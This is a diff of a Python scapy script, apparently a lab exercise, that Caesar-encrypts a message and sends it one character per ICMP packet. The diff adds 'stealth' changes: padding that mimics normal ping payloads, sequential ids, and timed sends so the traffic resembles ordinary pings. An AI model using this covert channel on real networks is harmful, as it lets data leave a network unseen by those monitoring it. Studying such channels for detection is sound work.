@@ -1,29 +1,39 @@
 import sys
 import unicodedata
+import time
 from scapy.all import IP, ICMP, send
 
 def normalizar_texto(texto):
     texto = texto.lower()
     texto = unicodedata.normalize("NFD", texto)
-    texto = "".join(c for c in texto if unicodedata.category(c) != "Mn")
-    return texto
+    return "".join(c for c in texto if unicodedata.category(c) != "Mn")
 
 def cesar_cipher(texto, desplazamiento):
     resultado = ""
     for char in texto:
-        if char.isalpha():  # Solo letras
+        if char.isalpha():
             nueva_pos = (ord(char) - ord('a') + desplazamiento) % 26
             resultado += chr(nueva_pos + ord('a'))
         else:
-            resultado += char  # Mantener espacios
+            resultado += char
     return resultado
 
-def enviar_icmp_por_caracter(mensaje, destino="8.8.8.8"):
+def enviar_icmp_stealth(mensaje, destino="8.8.8.8"):
+    icmp_id = 0x1234   
+    seq = 0
     for char in mensaje:
-        paquete = IP(dst=destino)/ICMP()/char.encode()
+        payload = (
+            char.encode() +              # primer byte = char
+            b"\x00" * 8 +                # "8 primeros bytes" ICMP coherentes
+            bytes(range(0x10, 0x38))     # desde 0x10 a 0x37
+        )
+
+        paquete = IP(dst=destino)/ICMP(id=icmp_id, seq=seq)/payload
         send(paquete, verbose=0)
-        print(f"Sent 1 packets")
+        print(f"Sent 1 packets.")
         print(f".")
+        seq += 1
+        time.sleep(1)  # simular ping normal
 
 if __name__ == "__main__":
     if len(sys.argv) < 3:
@@ -37,6 +47,5 @@ if __name__ == "__main__":
     texto_normalizado = normalizar_texto(texto)
     cifrado = cesar_cipher(texto_normalizado, desplazamiento)
     print("Mensaje cifrado:", cifrado)
-
-    print("\nEnviando caracteres por ICMP...")
-    enviar_icmp_por_caracter(cifrado, destino)
+    print("\nEnviando caracteres por ICMP stealth...")
+    enviar_icmp_stealth(cifrado, destino)
